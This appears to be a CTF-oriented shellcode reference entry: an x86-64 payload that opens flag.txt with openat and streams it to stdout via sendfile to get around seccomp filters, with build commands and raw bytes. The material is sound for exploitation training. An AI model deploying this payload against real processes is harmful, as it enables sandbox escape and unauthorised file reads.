# openat + sendfile (x64)

## What it does
Opens a file (`flag.txt`, relative to the current working directory) with
`openat()` and streams its contents directly to stdout with `sendfile()`,
skipping the manual `read()`/`write()` loop that `orw` uses.

## Syscalls used
- `openat` (257)
- `sendfile` (40)

## When to use it
- `execve` is blocked by seccomp but file reads are allowed.
- `read`/`write` are filtered but `sendfile` isn't — `openat_sendfile` gets
  the file contents out in one syscall instead of two.
- Shorter / cleaner alternative to a classic `orw` chain when `sendfile`
  is available.

The filename (`flag.txt`) is hardcoded on the stack — swap `'flag.txt'` for
any 8-byte-or-less path, or chain pushes for longer filenames.

## Constraints / bad chars
- `AT_FDCWD` (`-100`) and the syscall numbers (`257`, `40`) introduce
  `\xff` and other high bytes — not alphanumeric-safe as-is.
- Reads a fixed `100` bytes (`r10b, 100`); increase/decrease `count` to
  taste for larger/smaller files.
- Relies on CWD being where the target file actually lives (`AT_FDCWD`);
  use an absolute path + push the full string if CWD isn't guaranteed.

## Size
60 bytes

## Build
    nasm -f elf64 openat_sendfile.asm -o openat_sendfile.o
    ld openat_sendfile.o -o openat_sendfile

## Bytes
    b'\x48\x31\xc0\x50\x48\xbb\x66\x6c\x61\x67\x2e\x74\x78\x74\x53\x48\x89\xe6\x48\xc7\xc7\x9c\xff\xff\xff\x89\xc2\x49\x89\xc2\x66\xb8\x01\x01\x0f\x05\x48\x89\xc6\x48\x31\xc0\x48\x31\xff\x40\xb7\x01\x89\xc2\x4d\x31\xd2\x41\xb2\x64\xb0\x28\x0f\x05'
